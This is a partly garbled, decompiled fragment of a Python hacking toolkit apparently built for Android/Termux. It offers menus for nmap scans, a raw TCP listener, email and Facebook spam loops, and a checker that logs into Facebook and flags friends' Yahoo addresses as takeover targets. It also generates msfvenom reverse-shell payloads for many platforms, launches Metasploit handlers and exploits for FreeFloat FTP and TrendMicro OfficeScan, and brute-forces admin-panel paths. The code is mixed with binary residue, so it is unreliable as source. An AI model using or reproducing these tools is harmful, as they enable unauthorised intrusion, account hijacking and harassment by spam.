� td�} | dksv| dkr�td�}t �d| � td� t�  �n�| dks�| dkr�td�}t �d| � td� t�  �n�| dks�| dk�rtd�}t �d| � td� t�  �nX| dk�s$| dk�rLtd�}t �d| � td� t�  �n| dk�s`| dk�r�td�}t �d | � td� t�  n�| d!k�s�| d"k�r�td�}t �d#| � td$� t�  n�| d%k�s�| d&k�r�td'�}t �d(| � td)� t�  nn| d*k�s| d+k�r4td'�}t �d,| � td-� t�  n4| d.k�sH| d/k�rPt�  ntd0� t�	d1� t�  d S )2Nr"   z*[1;33m[[1;31m01[1;33m] Scan IP or host z*[[1;31m03[1;33m] Read list networks filez0[[1;31m04[1;33m] OS and version detection scanz=[[1;31m05[1;33m] Scan a host when protected by the firewallz,[[1;31m06[1;33m] Scan an IPv6 host/addressz:[[1;31m07[1;33m] Only show open (or possibly open) portsz5[[1;31m08[1;33m] Show all packets sent and receivedzK[[1;31m09[1;33m] Fast scan all your devices/computers for open ports everz![[1;31m00[1;33m] exit or Back

z[1;34mEntr number >> :[1;32m r_   r`   �[1;31mEnter ip >> :[1;32m znmap z
    [1;31m Enter Back
ra   rb   z#[1;31mEnter name file >> :[1;32m z	nmap -iL z
  [1;31m   Enter Back
rc   rd   znmap -A z
    [1;32m Enter Back
re   rf   z	nmap -PN z
   [1;31m  Enter Back
�5�05znmap -6 �6�06znmap --open z
     [1;31mEnter Back
�7�07z[1;31mEnter ip >> : [1;32mznmap --packet-trace z
   [1;35m  Enter Back
�8�08z	nmap -T5 z
     [1;35mEnter Back
rs   rt   r�   r   )
r)   r*   r   r!   r   r+   �nmapr{   ru   rv   )r}   �ipr   r   r   r�   �  st    





r�   c                  C   s�  t �d� t�  t�  td� td� td� td� td� td� td� td	�} | d
kr�td�}t|�� ��� }td| � td� t	�  �n`| dkr�td�}t
|�� ��� }td| � td� t	�  �n"| dk�rtd�}t|�� ��� }td| � td� t	�  n�| dk�rNtd�}t|�� ��� }td| � td� t	�  n�| dk�r�td�}	t|	�� ��� }
td|
 � td� t	�  nh| dk�r�td�}t|�� ��� }td| � td� t	�  n*| dk�r�t�  ntd� t�d� t	�  d S )Nr"   z#[1;36m[[1;31m1[1;36m][1;34m md5z%[1;36m[[1;31m2[1;36m][1;34m sha-1z'[1;36m[[1;31m3[1;36m][1;34m sha-224z'[1;36m[[1;31m4[1;36m][1;34m sha-256z'[1;36m[[1;31m5[1;36m][1;34m sha-384z'[1;36m[[1;31m6[1;36m][1;34m sha-512z'[1;36m[[1;31m0[1;36m][1;34m Back


z#[1;35mEnter name hash >> :[1;32m ra   z*[1;31mEnter the word to hash >> : [1;32m�[1;34mz    [1;31m   

Enter Back 

rc   z*[1;31mEnter the word to hash >> :[1;32m z   [1;31m    

Enter Back 

r_   z*[1;36mEnter the word to hash >> : [1;32mz[1;31mz [1;34m      

Enter Back 

re   r�   r�   rs   z%[1;33m[[1;31m-[1;33m] [1;36mERRORr   )r)   r*   r   r!   r   r+   Zsha1�encode�	hexdigest�hashZsha224�md5Zsha256Zsha384Zsha512r{   ru   rv   )�j�n�xr3   Zkillerr}   Zhitman�gZsofi�kZnhu�mZnhr   r   r   r�   �  sh    








r�   c                  C   s�   t �d� t�  t�  ttd��} ttd��}t�tjtj	�}|�
| |f� |�d� td| |f � dd� }|�� \}}td|d	 |d
 f � tj||fd�}|��  qnd S )Nr"   r�   z[1;35mEnter port >> : [1;32mr   z'[1;34m[*] Listening on > [1;31m%s:%d c                 S   s,   | � d�}td| � | �d� | ��  d S )Nrg   z[1;34m[*] Reveived:[1;31m %s zACK!)Zrecvr   �sendrS   )Zclient_socket�requestr   r   r   �handle_client(  s    

z open_port.<locals>.handle_clientz2[1;34m[*] Accepted connections from [1;31m%s:%d r   r   )�target�args)r)   r*   r   r!   �strr+   rW   �socketZAF_INETZSOCK_STREAMZbindZlistenr   Zaccept�	threadingZThread�start)Zbind_ipZ	bind_portr@   r�   �clientZaddrZclient_handlerr   r   r   �	open_port  s    

r�   c                     sN   dd l � t�d� G � fdd�d�} t�  t�  | ttd��ttd��� d S )Nr   r"   c                       s(   e Zd Zdd� Zdd� Z� fdd�ZdS )zclong.<locals>.YCc                 S   sp   || _ || _z| �� d | _td� W n$ tk
rJ   td� t��  Y nX | �t	�
t�d| j� ��j�� d S )NZaccess_tokenu   [1;31m[√] Login Berhasil 

u   [1;32m[×] Login Gagal

z3https://graph.facebook.com/me/friends?access_token=)r$   �pw�_YC__getTokenr�   r   �KeyError�sysr1   �_YC__looping�json�loadsr(   r.   �text)�selfr$   r�   r   r   r   �__init__6  s    zclong.<locals>.YC.__init__c              	   S   s�  t �� }|�d� |d D �]~}z,t�t�d|d  d | j �j�d }W n t	k
rd   Y qY nX d|krnq|�
d� d	|j_|jd
d� ||d< t|�� �� dd�}|�d�}d}|D ].}z|�d�dkr�d}W  q�W q�   Y q�X q�dt|� }	|dk�rZdt|�d  }
td� td| |	d  |
d d  | |
d d  d � td� qdt|�d  }
td| |	d  |
d  d!  | |
d" d  � qd S )#NFr'   zhttps://graph.facebook.com/�idz?access_token=r$   z	yahoo.comz_https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comTr   rF   Zusernamezhtml.parser)Zfeaturesr�   z[1;34mNot Vulnz
data-errorzmessages.ERROR_INVALID_USERNAMEz[1;32mVuln�   ZVuln�   r   ZP________________________________________________________________________________z[1;31m|z [1;32mr   � z	 [1;31m|r�   � r   z[1;34m r   )rH   rI   Zset_handle_robotsr�   r�   r(   r.   r�   r�   r�   r,   Z_factoryZis_htmlrK   r   rL   �readZfind_allrT   r   )r�   ZdataFL�brrZ   ZemZsoupZstatusZvulnr�   Z	len_emailZlen_vulnr   r   r   Z	__looping@  s@    
,




4
zclong.<locals>.YC.__loopingc                    sx   dd| j ddddd| jddd	�}d
| j � d| j� d��d�}� �d�}|�|� |�d|�� i� t�tj	d|d�j
�S )NZ 882a8490361da98702bf97a021ddc14dr4   ZJSONr_   Zen_USz
auth.loginrs   z1.0)Zapi_keyZcredentials_typer$   rM   Zgenerate_machine_idZgenerate_session_cookiesZlocale�methodr4   Zreturn_ssl_resources�vzGapi_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=z`format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=z;return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32zutf-8r�   �sigz'https://api.facebook.com/restserver.phpr&   )r$   r�   r�   �new�updater�   r�   r�   r(   r/   r�   )r�   r'   r�   r�   ��hashlibr   r   Z
__getTokenc  s"    �

zclong.<locals>.YC.__getTokenN)�__name__�
__module__�__qualname__r�   r�   r�   r   r�   r   r   �YC5  s   
#r�   z&[1;31m[+] Email/phone/id >> : [1;32mz'[1;36m[+] Password Accont >> : [1;32m)r�   r)   r*   r   r!   r�   r+   )r�   r   r�   r   �clong2  s    
?r�   c                  C   sN   t �d� t�  t�  td�} td� td� t �d|  � td� t�  d S )Nr"   z#[1;35mEnter pwd image >> :[1;32m a�  [1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*[1;34*z	[1;31m

zjp2a --width=40 z

 [1;32m   Enter Back 

)r)   r*   r   r!   r+   r   r{   )�pathr   r   r   �imagew  s    
r�   c                  C   s^  t �d� t�  t�  td� td�} | dks6| dkr�t �d� t�  t�  td�}td�}td�}td	�}zDt�d
d�}|��  |�	�  |�
||� |�|||� td� q�W n8 tjk
r�   td� Y n tk
r�   t��  Y nX | dks�| dk�r�t �d� t�  t�  td�}td�}td�}td�}zFt�dd�}|��  |�	�  |�
||� |�|||� td� �q\W n< tjk
�r�   td� Y n tk
�r�   t��  Y nX | dk�s�| dk�r�t �d� t�  t�  td�}td�}td�}td�}zFt�dd�}|��  |�	�  |�
||� |�|||� td� �q*W n< tjk
�rf   td� Y n tk
�r�   t��  Y nX | dk�s�| dk�r&t �d� t�  t�  td�}td �}t�d!�}t�||�}td"�}	|�|	�}
|
d# }td$�}td%�}tt|��D ]}|j||jtjd&�}�q
| d'k�s:| d(k�rBt�  ntd)� t�d*� t�  d S )+Nr"   z�[1;33m[[1;31m01[1;33m][1;34m spam Gmail
[1;33m[[1;31m02[1;33m][1;34m spam Hotmail
[1;33m[[1;31m03[1;33m][1;34m spam yahoo 
[1;33m[[1;31m04[1;33m][1;34m spam facebook
[1;33m[[1;31m00[1;33m][1;34m Back


z [1;36mEnter number >> : [1;32mr_   r`   z([1;31mEnter the your gmail >> :[1;32m z1[1;34mEnter the password your gmail >> : [1;32mz*[1;35mEnter the target email >> :[1;32m z![1;33mEnter the msg >> : [1;32mrB   r8   z[1;32mmsg sended :) z%[1;31mError in the password or gmailra   rb   z*[1;31mEnter the your Hotmail >> : [1;32mz3[1;34mEnter the password your Hotmail >> : [1;32mz,[1;35mEnter the target Hotmail >> :[1;32m z![1;36mEnter the msg >> : [1;32mr7   z'[1;31mError in the password or Hotmailrc   rd   z([1;31mEnter the your yahoo >> : [1;32mz1[1;34mEnter the password your yahoo >> : [1;32mz*[1;35mEnter the target yahoo >> : [1;32mzsmtp.yahoo.comz%[1;31mError in the password or yahoore   rf   z([1;33mEnter Email/phone/id >> :[1;32m ZNULLz"[1;34mEnter password >> : [1;32mz#[1;34mEnter id friend >> : [1;32mr   z([1;35mEnter message friend >> : [1;32mz%[1;36mEnter time friend >> : [1;32m)Z	thread_idZthread_typers   rt   z([1;33m[[1;31m![1;33m][1;35m ERROR !!r   )r)   r*   r   r!   r   r+   r:   r;   r=   r<   r>   ZsendmailZSMTPAuthenticationError�KeyboardInterruptr�   �quitr�   �getpass�fbchatZClientZsearchForUsers�rangerW   ZsendMessageZuidZ
ThreadTypeZUSERr{   ru   rv   �spam)r}   r$   Zpasssr�   �msgZserveZ	user_namer4   r�   Zfriend_nameZfriendsZfriend�message�timesrZ   Z
message_idr   r   r   r�   �  s�    







r�   c                  C   sX  t �d� t�  t�  td� ttd��} | dks:| dkr�t �d� t �d� td� td� td� td�}td	�}td
�}td� td� t �d| d | d | d � td� td| d � td� t�d� t	�  �np| dks�| dk�r�t �d� t �d� td� td� td� td�}td�}td�}td� td� t �d| d | d | d � td� td| d � td� t�d� t	�  �n�| dk�s�| dk�r^t �d� t �d� td� td� td� td�}td �}td!�}td� td� t �d"| d | d | d# � td� td| d$ � td� t�d� t	�  �n�| d%k�sr| d&k�rt �d� t �d'� td� td� td� td(�}td)�}td*�}td� td� t �d+| d | d | d, � td� td| d- � td� t�d� t	�  �n8| d.k�s0| d/k�r�t �d� t �d0� td� td� td� td1�}td2�}td3�}td� td� t �d4| d | d | d5 � td� td| d6 � td� t�d� t	�  �nz| d7k�s�| d8k�r�t �d� t �d9� td� td� td� td1�}td:�}td;�}td� td� t �d<| d | d | d= � td� td| d> � td� t�d� t	�  �
n�| d?k�s�| d@k�rVt �d� t �dA� td� td� td� td1�}tdB�}tdC�}td� td� t �dD| d | d | dE � td� tdF| dG � td� t�d� t	�  �	n�| dHk�sj| dIk�rt �d� t �dJ� td� td� td� tdK�}tdL�}tdM�}td� td� t �dN| d | d | dO � td� td| dP � td� t�d� t	�  �	n@| dQk�s(| dRk�r�t �d� t �dS� td� td� td� td(�}tdT�}tdU�}td� td� t �dV| d | d | dW � td� td| dX � td� t�d� t	�  �n�| dYk�r�t �d� t �dZ� td� td� td� td(�}tdT�}tdU�}td� td� t �d[| d | d | d\ � td� td| d] � td� t�d� t	�  �n�| d^k�r:t �d� t �d_� td� td� td� td(�}tdT�}tdU�}td� td� t �d`| d | d | da � td� td| db � td� t�d� t	�  �n| dck�r�td� td� tdd�}tde�}t �d� t�df� td� td� tdg� td� td� t �dh| di | dj � �n�| dkk�	rBtd� td� tdl�}tdm�}t �d� t�df� td� td� tdg� td� td� t �dn| di | dj � �n| dok�	r�td� td� tdp�}tdq�}t �d� t�df� td� td� tdg� td� td� t �dr| di | dj � �n�| dsk�
rJtd� td� tdt�}tdu�}t �d� t�df� td� td� tdg� td� td� t �dv| di | dj � �n
| dwk�
r�td� td� tdx�}tdq�}t �d� t�df� td� td� tdg� td� td� t �dy| di | dj � t �dz� �n|| d{k�r\td� td� td|�}td}�}t �d� t�df� td� td� tdg� td� td� t �d~| di | dj � �n�| dk�r�td� td� td|�}td��}t �d� t�df� td� td� tdg� td� td� t �d�| di | dj � �nt| d�k�rdtd� td� td��}td��}t �d� t�df� td� td� tdg� td� td� t �d�| di | dj � �n�| d�k�r�td� td� td��}td��}t �d� t�df� td� td� tdg� td� td� t �d�| di | dj � �nl| d�k�rltd� td� td��}tdu�}t �d� t�df� td� td� tdg� td� td� t �d�| di | dj � �n�| d�k�r�td� td� td��}td��}t �d� t�df� td� td� td�� td� td� t �d�| di | dj � �nd| d�k�rrtd� td� tdp�}td��}t �d� t�df� td� td� td�� td� td� t �d�| d� | d� � n�| d�k�r�td� td� td��}td��}t �d� t�df� td� td� td�� td� td� t �d�| d� | d� � n`| d�k�r
t �d�� nJ| d�k�r t �d�� n4| d�k�s4| d�k�r<t
�  ntd�� t�d�� t	�  d S )�Nr"   a�  

[1;33m[[1;31m01[1;33m][1;34m payload android           [1;33m[[1;31m02[1;33m][1;34m payload windows
[1;33m[[1;31m03[1;33m][1;34m payload python            [1;33m[[1;31m04[1;33m][1;34m payload prel
[1;33m[[1;31m05[1;33m][1;34m payload ruby              [1;33m[[1;31m06[1;33m][1;34m payload linux
[1;33m[[1;31m07[1;33m][1;34m payload php              [1;33m [[1;31m08[1;33m] [1;34mpayload java
[1;33m[[1;31m09[1;33m][1;34m payload bash              [1;33m[[1;31m10[1;33m][1;34m payload macho
[1;33m[[1;31m11[1;33m][1;34m payload shell
[1;33;41m|                                                 |[1;33;40m
[1;33m[[1;31m12[1;33m][1;35m exploit Android           [1;33m[[1;31m13[1;33m][1;35m exploit windows
[1;33m[[1;31m14[1;33m][1;35m exploit python            [1;33m[[1;31m15[1;33m][1;35m exploit perl
[1;33m[[1;31m16[1;33m][1;35m exploit ruby              [1;33m[[1;31m17[1;33m][1;35m exploit Linux
[1;33m[[1;31m18[1;33m][1;35m exploit php               [1;33m[[1;31m19[1;33m][1;35m exploit java
[1;33m[[1;31m20[1;33m][1;35m exploit bash              [1;33m[[1;31m21[1;33m][1;35m exploit macho
[1;33m[[1;31m22[1;33m][1;35m exploit shell             [1;33m[[1;31m23[1;33m][1;35m exploit port 21
[1;33m[[1;31m24[1;33m][1;35m exploit port 443          [1;33m[[1;31m25[1;33m][1;35m Download msf
[1;33m[[1;31m26[1;33m][1;35m Download msf 5.0.0        [1;33m[[1;31m00[1;33m][1;35m back


    z"[1;34mEnter a number >> :[1;32m r_   r`   z+toilet -f big 'payload apk' -F gay | lolcatr�   z  [1;34m   ip >> : z   [1;31m     port >> : z    [1;35m        name >> : z2msfvenom -p android/meterpreter/reverse_tcp LHOST=z LPORT=z R > /sdcard/Alsakka/payload/z.apk z/[1;33m<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<z[1;32m     payload/ z .apk/sdcard/Alsakkar   ra   rb   z'toilet -f big 'windows' -F gay | lolcatz[1;32m     ip >> : z[1;33m         port >> : z[1;36m             name >> : z2msfvenom -p windows/meterpreter/reverse_tcp LHOST=z.exez[1;32m  save payload/ z.exe/sdcard/Alsakkarc   rd   z&toilet -f big 'python' -F gay | lolcatz[1;31m         port >> :! z[1;35m             name >> : z1msfvenom -p python/meterpreter/reverse_tcp LHOST=z.pyz.py/sdcard/Alsakkare   rf   z,toilet -f big 'payload perl' -F gay | lolcatz[1;31m     ip >> : z[1;32m         port >> : z[1;33m             name >> : z(msfvenom -p cmd/unix/reverse_perl LHOST=z.plz.pl/sdcard/Alsakkar�   r�   z,toilet -f big 'payload ruby' -F gay | lolcatz[1;33m     ip >> : z[1;31m          port >> : z[1;34m              name >> : z(msfvenom -p cmd/unix/reverse_ruby LHOST=z.rbz.rb/sdcard/Alsakkar�   r�   z-toilet -f big 'payload Linux' -F gay | lolcatz[1;31m       port >> : z[1;32m          name >> : z0msfvenom -p linux/meterpreter/reverse_tcp LHOST=z.elfz.linux/sdcard/Alsakkar�   r�   z+toilet -f big 'payload php' -F gay | lolcatz[1;36m        port >> : z[1;34m           name >> : z.msfvenom -p php/meterpreter/reverse_tcp LHOST=z.phpz[1;32m  save payload z.php/sdcard/Alsakkar�   r�   z,toilet -f big 'payload java' -F gay | lolcatz[1;36m     ip >> : z[1;35m        port >> : z[1;32m           name >> : z/msfvenom -p java/meterpreter/reverse_tcp LHOST=z.jarz.jar/sdcard/Alsakka�9�09z,toilet -f big 'payload bash' -F gay | lolcatz[1;34m        port >> : z[1;36m            name >> : z,msfvenom -p cmd/unix/reverse_bash_udp LHOST=z.shz.sh/sdcard/Alsakka�10z+toilet -f big 'payload ios' -F gay | lolcatz,msfvenom -p osx/x86/shell_reverse_tcp LHOST=z.machoz.macho/sdcard/Alsakka�11z-toilet -f big 'payload shell' -F gay | lolcatz1msfvenom -p windows/powershell_reverse_tcp LHOST=z.pslz.psl/sdcard/Alsakka�12z[1;33mTARGET IP >> : [1;32mz[1;31mSET LPORT >> :[1;33m r
   z3[1;36mSTarting the Metasploit Framework msfconsolezdmsfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST z; set LPORT z; run "�13z[1;35mTARGET IP >> : [1;34mzSET LPORT >> : zdmsfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST �14z[1;34mTARGET IP >> :[1;31m z[1;36mSET LPORT >> : [1;32mzcmsfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST �15z[1;36mTARGET IP >> :[1;33m z[1;34mSET LPORT >> :[1;35m zZmsfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_perl; set LHOST �16z[1;33mTARGET IP >> :[1;31m zZmsfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_ruby; set LHOST z,cd $HOME && cd Alsakka && python .Alsakka.py�17z[1;35mTARGET IP >> :[1;34m z[1;32mSET LPORT >> : [1;33mzbmsfconsole -q -x "use exploit/multi/handler; set payload linux/meterpreter/reverse_tcp; set LHOST �18z[1;31mSET LPORT >> : [1;32mz`msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST �19z[1;36mTARGET IP >> :[1;31m z[1;34mSET LPORT >> : [1;32mzamsfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST �20z[1;31mTARGET IP >> :[1;32m z[1;33mSET LPORT >> : [1;33mz^msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_bash_udp; set LHOST �21z[1;31mTARGET IP >> :[1;33m z^msfconsole -q -x "use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp; set LHOST �22z[1;35mTARGET IP >> :[1;32m z[1;33mSET LPORT >> : [1;31mz3[1;37mSTarting the Metasploit Framework msfconsolezcmsfconsole -q -x "use exploit/multi/handler; set payload windows/powershell_reverse_tcp; set LHOST �23z[1;35mSET RHOSTS >> : [1;37mz3[1;33mSTarting the Metasploit Framework msfconsoleztmsfconsole -q -x "use exploit/windows/ftp/freefloatftp_wbem; set payload windows/meterpreter_reverse_tcp; set LHOST z; set LPORT 21; set RHOSTS z exploit -j "�24z[1;31mSET RHOSTS >> : [1;33mz3[1;31mSTarting the Metasploit Framework msfconsolez�msfconsole -q -x "use exploit/windows/http/trendmicro_officescan_widget_exec; set payload windows/meterpreter_reverse_tcp; set LHOST z; set LPORT 443; set RHOSTS z; exploit -j "�25zYapt update && apt upgrade -y && pkg install unstable-repo -y && pkg install metasploit -y�26z�git clone https://github.com/rapid7/metasploit-framework && pkg install metasploit -y && cd metasploit-framework && chmod +x * && msfconsolert   rs   z.
[1;33m[[1;31m-[1;33m][1;31m ERROR[1;39m r   )r)   r*   r   r!   r   r�   r+   ru   rv   �
metasploitr{   )r}   r�   Zportr�   ZLHOSTZLPORT�lor   r   r   r�   �  s�   


"



"



"



"



"



"



"



"



"




"




"











































r�   c                  C   s�   t �d� t�  t�  td�} d}|D ]t}| | }z4tj�|�}td� td� td| � td� W q& tj	j
k
r� } ztd| � W 5 d }~X Y q&X q&d S )Nr"   z%[1;34mEnter the website >> :[1;32m (�  zadmin/zadministrator/�	login.phpzadministration/zadmin1/zadmin2/zadmin3/zadmin4/zadmin5/z
moderator/z	webadmin/z
adminarea/z	bb-admin/�adminLogin/�admin_area/�panel-administracion/�
instadmin/�memberadmin/�administratorlogin/�adm/zaccount.asp�admin/account.aspzadmin/index.aspzadmin/login.aspzadmin/admin.aspz/login.aspxzadmin_area/admin.aspzadmin_area/login.asp�admin/account.html�admin/index.html�admin/login.html�admin/admin.html�admin_area/admin.html�admin_area/login.html�admin_area/index.htmlzadmin_area/index.aspzbb-admin/index.aspzbb-admin/login.aspzbb-admin/admin.asp�bb-admin/index.html�bb-admin/login.html�bb-admin/admin.html�admin/home.html�admin/controlpanel.html�
admin.html�admin/cp.html�cp.html�administrator/index.html�administrator/login.html�administrator/account.html�administrator.html�
login.html�modelsearch/login.html�moderator.html�moderator/login.html�moderator/admin.html�account.html�controlpanel.html�admincontrol.html�admin_login.html�panel-administracion/login.htmlzadmin/home.aspzadmin/controlpanel.asp�	admin.aspzpages/admin/admin-login.aspzadmin/admin-login.aspzadmin-login.aspzadmin/cp.aspzcp.aspzadministrator/account.aspzadministrator.aspz
acceso.aspz	login.aspzmodelsearch/login.aspzmoderator.aspzmoderator/login.aspzadministrator/login.aspzmoderator/admin.aspzcontrolpanel.aspr�   �adminpanel.html�webadmin.htmlZadministration�pages/admin/admin-login.html�admin/admin-login.html�webadmin/index.html�webadmin/admin.html�webadmin/login.htmlzuser.asp�	user.html�admincp/index.asp�admincp/login.asp�admincp/index.html�admin/adminLogin.html�adminLogin.htmlr  �	home.html�adminarea/index.html�adminarea/admin.html�adminarea/login.html�panel-administracion/index.html�panel-administracion/admin.html�modelsearch/index.html�modelsearch/admin.html�admin/admin_login.html�admincontrol/login.html�adm/index.html�adm.htmlzadmincontrol.aspr�   zadminpanel.aspzwebadmin.aspzwebadmin/index.aspzwebadmin/admin.aspzwebadmin/login.aspzadmin/admin_login.aspzadmin_login.aspzpanel-administracion/login.aspzadminLogin.aspzadmin/adminLogin.aspzhome.aspr  zadminarea/index.aspzadminarea/admin.aspzadminarea/login.asp�admin-login.htmlzpanel-administracion/index.aspzpanel-administracion/admin.aspzmodelsearch/index.aspzmodelsearch/admin.aspzadministrator/index.aspzadmincontrol/login.aspzadm/admloginuser.aspzadmloginuser.aspz
admin2.aspzadmin2/login.aspzadmin2/index.aspzadm/index.aspzadm.aspzaffiliate.aspzadm_auth.aspzmemberadmin.aspzadministratorlogin.aspzsiteadmin/login.aspzsiteadmin/index.asp�siteadmin/login.htmlr�   r�   r�   �admin/account.phpzadmin/index.phpzadmin/login.phpzadmin/admin.phpr)  zadmin_area/admin.phpzadmin_area/login.phpzsiteadmin/login.phpzsiteadmin/index.phpr(  r�   r�   r�   r�   zadmin_area/index.phpzbb-admin/index.phpzbb-admin/login.phpzbb-admin/admin.phpzadmin/home.phpr�   r�   zadmin/controlpanel.php�	admin.phpr  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.phpzcp.phpzadministrator/index.phpzadministrator/login.phpznsw/admin/login.phpzwebadmin/login.phpzadmin/admin_login.phpzadmin_login.phpzadministrator/account.phpzadministrator.phpr�   zpages/admin/admin-login.phpzadmin/admin-login.phpzadmin-login.phpr�   r�   z
acceso.phpr�   r�   r�   zmodelsearch/login.phpzmoderator.phpzmoderator/login.phpzmoderator/admin.phpzaccount.phpr  r  r'  zcontrolpanel.phpzadmincontrol.phpr  r  r  r  zrcjakar/admin/login.phpr  r  zwebadmin.phpzwebadmin/index.phpzwebadmin/admin.phpr�   r�   r�   r�   zadminpanel.phpr  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  zuser.phpr  r	  r
  zpanel-administracion/login.phpzwp-login.phpzadminLogin.phpzadmin/adminLogin.phpzhome.phpr*  zadminarea/index.phpzadminarea/admin.phpzadminarea/login.phpzpanel-administracion/index.phpzpanel-administracion/admin.phpzmodelsearch/index.phpzmodelsearch/admin.phpzadmincontrol/login.phpzadm/admloginuser.phpzadmloginuser.phpz
admin2.phpzadmin2/login.phpzadmin2/index.phpzusuarios/login.phpzadm/index.phpzadm.phpzaffiliate.phpzadm_auth.phpzmemberadmin.phpzadministratorlogin.phpr�   �admin/account.cfmzadmin/index.cfmzadmin/login.cfmzadmin/admin.cfmr+  zadmin_area/admin.cfmzadmin_area/login.cfmzsiteadmin/login.cfmzsiteadmin/index.cfmr(  r�   r�   r�   r�   zadmin_area/index.cfmzbb-admin/index.cfmzbb-admin/login.cfmzbb-admin/admin.cfmzadmin/home.cfmr�   r�   zadmin/controlpanel.cfm�	admin.cfmr  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.cfmzcp.cfmzadministrator/index.cfmzadministrator/login.cfmznsw/admin/login.cfmzwebadmin/login.cfmzadmin/admin_login.cfmzadmin_login.cfmzadministrator/account.cfmzadministrator.cfmr�   zpages/admin/admin-login.cfmzadmin/admin-login.cfmzadmin-login.cfmr�   r�   r�   r�   z	login.cfmzmodelsearch/login.cfmzmoderator.cfmzmoderator/login.cfmzmoderator/admin.cfmzaccount.cfmr  r  r'  zcontrolpanel.cfmzadmincontrol.cfmr  z
acceso.cfmr  r  r  zrcjakar/admin/login.cfmr  r  zwebadmin.cfmzwebadmin/index.cfmzwebadmin/admin.cfmr�   r�   r�   r�   zadminpanel.cfmr  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  zuser.cfmr  r	  r
  zpanel-administracion/login.cfmzwp-login.cfmzadminLogin.cfmzadmin/adminLogin.cfmzhome.cfmr,  zadminarea/index.cfmzadminarea/admin.cfmzadminarea/login.cfmzpanel-administracion/index.cfmzpanel-administracion/admin.cfmzmodelsearch/index.cfmzmodelsearch/admin.cfmzadmincontrol/login.cfmzadm/admloginuser.cfmzadmloginuser.cfmz
admin2.cfmzadmin2/login.cfmzadmin2/index.cfmzusuarios/login.cfmzadm/index.cfmzadm.cfmzaffiliate.cfmzadm_auth.cfmzmemberadmin.cfmzadministratorlogin.cfmr�   r�   r�   r�   �
login.aspxr�   r�   r�   �admin/account.aspxzadmin/index.aspxzadmin/login.aspxzadmin/admin.aspxr.  zadmin_area/admin.aspxzadmin_area/login.aspxzsiteadmin/login.aspxzsiteadmin/index.aspxr(  r�   r�   r�   r�   zadmin_area/index.aspxzbb-admin/index.aspxzbb-admin/login.aspxzbb-admin/admin.aspxzadmin/home.aspxr�   r�   zadmin/controlpanel.aspx�
admin.aspxr  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.aspxzcp.aspxzadministrator/index.aspxzadministrator/login.aspxznsw/admin/login.aspxzwebadmin/login.aspxzadmin/admin_login.aspxzadmin_login.aspxzadministrator/account.aspxzadministrator.aspxr�   zpages/admin/admin-login.aspxzadmin/admin-login.aspxzadmin-login.aspxr�   r�   r�   r�   r-  zmodelsearch/login.aspxzmoderator.aspxzmoderator/login.aspxzmoderator/admin.aspxzacceso.aspxzaccount.aspxr  r  r'  zcontrolpanel.aspxzadmincontrol.aspxr  r  r  r  zrcjakar/admin/login.aspxr  r  zwebadmin.aspxzwebadmin/index.aspxzwebadmin/admin.aspxr�   r�   r�   r�   zadminpanel.aspxr  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  z	user.aspxr  r	  r
  zpanel-administracion/login.aspxzwp-login.aspxzadminLogin.aspxzadmin/adminLogin.aspxz	home.aspxr/  zadminarea/index.aspxzadminarea/admin.aspxzadminarea/login.aspxzpanel-administracion/index.aspxzpanel-administracion/admin.aspxzmodelsearch/index.aspxzmodelsearch/admin.aspxzadmincontrol/login.aspxzadm/admloginuser.aspxzadmloginuser.aspxzadmin2.aspxzadmin2/login.aspxzadmin2/index.aspxzusuarios/login.aspxzadm/index.aspxzadm.aspxzaffiliate.aspxzadm_auth.aspxzmemberadmin.aspxzadministratorlogin.aspxr�   r�   r�   �admin/account.jszadmin/index.jszadmin/login.jszadmin/admin.jsr0  zadmin_area/admin.jszadmin_area/login.jszsiteadmin/login.jszsiteadmin/index.jsr(  r�   r�   r�   r�   zadmin_area/index.jszbb-admin/index.jszbb-admin/login.jszbb-admin/admin.jszadmin/home.jsr�   r�   zadmin/controlpanel.js�admin.jsr  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.jszcp.jszadministrator/index.jszadministrator/login.jsznsw/admin/login.jszwebadmin/login.jszadmin/admin_login.jszadmin_login.jszadministrator/account.jszadministrator.jsr�   zpages/admin/admin-login.jszadmin/admin-login.jszadmin-login.jsr�   r�   r�   r�   zlogin.jszmodelsearch/login.jszmoderator.jszmoderator/login.jszmoderator/admin.jsz
